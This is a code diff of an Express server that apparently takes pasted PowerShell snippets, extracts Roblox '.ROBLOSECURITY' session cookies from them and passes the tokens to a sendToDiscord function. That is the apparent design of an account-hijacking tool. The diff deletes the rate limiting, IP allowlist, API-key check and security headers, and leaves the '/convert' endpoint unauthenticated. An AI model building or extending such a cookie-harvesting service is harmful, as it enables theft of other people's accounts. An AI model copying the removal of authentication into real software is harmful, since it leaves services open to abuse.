@@ -7,122 +7,8 @@ const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-
-// Trust proxy for accurate IP detection
-app.set('trust proxy', true);
-
-// Apply security middlewares
-app.use(securityHeadersMiddleware);
-app.use(rateLimitMiddleware);
-app.use(ipWhitelistMiddleware);
-
 app.use(bodyParser.json());
 app.use(bodyParser.text({ type: '*/*' }));
-
-// Security Configuration
-const SECURITY_CONFIG = {
-  apiKeys: process.env.API_KEY ? process.env.API_KEY.split(',').map(key => key.trim()) : [],
-  allowedIPs: process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',').map(ip => ip.trim()) : [],
-  rateLimitEnabled: process.env.RATE_LIMIT_ENABLED === 'true',
-  requireAuth: process.env.REQUIRE_AUTH === 'true'
-};
-
-// Rate limiting store (simple in-memory)
-const rateLimitStore = new Map();
-
-// IP-based rate limiting middleware
-function rateLimitMiddleware(req, res, next) {
-  if (!SECURITY_CONFIG.rateLimitEnabled) {
-    return next();
-  }
-  
-  const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'];
-  const now = Date.now();
-  const windowMs = 15 * 60 * 1000; // 15 minutes
-  const maxRequests = 10; // Max 10 requests per 15 minutes
-  
-  if (!rateLimitStore.has(clientIP)) {
-    rateLimitStore.set(clientIP, { count: 1, resetTime: now + windowMs });
-    return next();
-  }
-  
-  const userData = rateLimitStore.get(clientIP);
-  
-  if (now > userData.resetTime) {
-    // Reset the window
-    rateLimitStore.set(clientIP, { count: 1, resetTime: now + windowMs });
-    return next();
-  }
-  
-  if (userData.count >= maxRequests) {
-    return res.status(429).json({ 
-      error: 'Too many requests. Please try again later.',
-      retryAfter: Math.ceil((userData.resetTime - now) / 1000)
-    });
-  }
-  
-  userData.count++;
-  return next();
-}
-
-// IP whitelist middleware
-function ipWhitelistMiddleware(req, res, next) {
-  if (SECURITY_CONFIG.allowedIPs.length === 0) {
-    return next(); // No IP restriction if no IPs are configured
-  }
-  
-  const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'];
-  
-  if (!SECURITY_CONFIG.allowedIPs.includes(clientIP)) {
-    return res.status(403).json({ error: 'Access denied from this IP address' });
-  }
-  
-  next();
-}
-
-// API Key Authentication Middleware
-function authenticateAPI(req, res, next) {
-  if (!SECURITY_CONFIG.requireAuth) {
-    return next(); // Skip auth if not required
-  }
-  
-  const apiKey = req.headers['x-api-key'] || req.headers['authorization']?.replace('Bearer ', '');
-  
-  if (!apiKey) {
-    return res.status(401).json({ error: 'API key required' });
-  }
-  
-  if (!SECURITY_CONFIG.apiKeys.includes(apiKey)) {
-    return res.status(403).json({ error: 'Invalid API key' });
-  }
-  
-  next();
-}
-
-// CORS and security headers middleware
-function securityHeadersMiddleware(req, res, next) {
-  // Only allow requests from your domain in production
-  const allowedOrigins = process.env.ALLOWED_ORIGINS ? 
-    process.env.ALLOWED_ORIGINS.split(',').map(origin => origin.trim()) : 
-    ['*']; // Allow all in development
-  
-  const origin = req.headers.origin;
-  if (allowedOrigins.includes('*') || allowedOrigins.includes(origin)) {
-    res.header('Access-Control-Allow-Origin', origin || '*');
-  }
-  
-  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, X-API-Key');
-  res.header('X-Content-Type-Options', 'nosniff');
-  res.header('X-Frame-Options', 'DENY');
-  res.header('X-XSS-Protection', '1; mode=block');
-  
-  if (req.method === 'OPTIONS') {
-    res.sendStatus(200);
-  } else {
-    next();
-  }
-}
 
 // Serve static files from public directory
 app.use(express.static(path.join(__dirname, 'public')));
@@ -412,7 +298,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
 }
 
 // API endpoint to convert PowerShell to .ROBLOSECURITY
-app.post('/convert', authenticateAPI, async (req, res) => {
+app.post('/convert', async (req, res) => {
   try {
     let input;
     let scriptType;
